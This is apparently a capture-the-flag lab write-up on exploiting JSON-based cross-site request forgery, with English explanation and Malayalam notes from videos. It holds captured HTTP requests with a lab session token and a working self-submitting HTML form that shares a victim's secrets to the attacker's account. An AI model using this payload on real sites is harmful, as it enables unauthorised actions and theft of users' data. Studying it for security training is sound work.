## Introduction
-->This exercise details the exploitation of a Cross-Site Request Forgery when JSON is used

## Cross-Site Request Forgery and JSON
-->A lot of websites rely on the fact that they are using JSON to prevent CSRF.
-->However, depending on the way the server behaves (and mostly the management of the Content-Type header), it can be trivial to send a request that contains JSON.
-->To do so you will need to create a form that looks like the code below:
```html
<form id="csrf" action="http://example/change_password" method="POST" enctype="text/plain" >
<input type="hidden" name='{"password":"Password123' value='"}' >
</form>
```

## Detection of Cross-Site Request Forgery
-->In order to detect a JSON CSRF, you need to search for potentially dangerous requests that are completely predictable and where the Content-Type does not impact the parsing of the request.

## Exploitation
-->To exploit the issue in this challenge, you can use the form above and use it to make the dangerous change in the application.
-->Then you will need to host this page on a public IP address and get the victim to visit your malicious site.

## Conclusion
-->This exercise showed you a way to exploit a JSON Cross-Site Request Forgery to manage to get an administrator to perform unwanted actions.
-->It's a simple introduction, but it helps us get the foundation in place for the next exercises on CSRF.

# Video Explanation
## Video 1 - introduction
-->ipo pandathe pole request oke username=josu&password=josu enna format il thane akanamenila. json format ilum aakam.so angane namal json format il chyuna csrf aan ivide nokunath
-->ingane chyumbol chela karyangal nokanam ie
- csrf token undakan padila
- request ile json paramter il namuk extra entengilum add chythalum error verathirikanam
- content-type: applicaiton/json ennath mati plain/text  enn italum error veran padila

## Video 2 - exploitation
-->lab open aakuka enit namal oru accoutn undakuka.enit new value enna iput il oru value kodukua.enit avide share enna option und.so ath click chyth oru user ine select chyuka
-->ini burp il poi /share enna reqeust il poi nokiyal kanam
```http
POST /share HTTP/1.1
Host: ptl-0c4dbec7-883d6d9d.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Content-Length: 22
Origin: http://ptl-0c4dbec7-883d6d9d.libcurl.so
Connection: close
Referer: http://ptl-0c4dbec7-883d6d9d.libcurl.so/key/0
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Impvc3UifQ.aYjyIT-8Gc01RqGagkqfTISrS5nqAwiUqMDgLlwVvu4

{"user":"josu","id":0}
```
ivide kanam credential json format il aan pokunath.ini namuk ee json il extra enthengilum add chyumbozhum namuk nerthe kitiya same error thane aan kanikunath.athuupole content-type header mati plain/text enn idumbozhum same result aan kitunath.porathathin ivide csrf token um ila ie,
```http
POST /share HTTP/1.1
Host: ptl-0c4dbec7-883d6d9d.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: plain/text
Content-Length: 36
Origin: http://ptl-0c4dbec7-883d6d9d.libcurl.so
Connection: close
Referer: http://ptl-0c4dbec7-883d6d9d.libcurl.so/key/0
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Impvc3UifQ.aYjyIT-8Gc01RqGagkqfTISrS5nqAwiUqMDgLlwVvu4

{"user":"josu",
"id":0,
"jhg":"jhg"}
```
-->ini script aakam athin mumb ivide nadakuna logic onukode parayam ie, namal oru secret value aakiyitanalo matoru user in share chyunath.so namal akiya ela secret um orumich share chyum.so ini namal oru csrf html fiel aaki namude website il aaki ittal victim epozhengilum namude site il kerumbol avante kayil ulla ella secret value um namal kodukuna user inte account ilek share aakum ie, ivide josu inte account ilek kerumen ok
-->ini csrf script nokam :
```html
<html>
<body onload="document.getElementById('csrf').submit()">
	<form id=csrf action=http://ptl-0c4dbec7-883d6d9d.libcurl.so/share method=POST enctype="text/plain">
		<input name='{"user":"josu","id":0,"fake":"' value='"}'>
	</form>
</body>
</html>
```

-->ee script oru html file il aaki save chyth python vech webserver aaki.namal ee file ulla pathilek poi nokuka.error verunilengil aayi ennartham.
-->ini namal lab il ulla input il ee namude path itt send adichal admin namude pathil kerumbol namuk adminte secret key kitum ok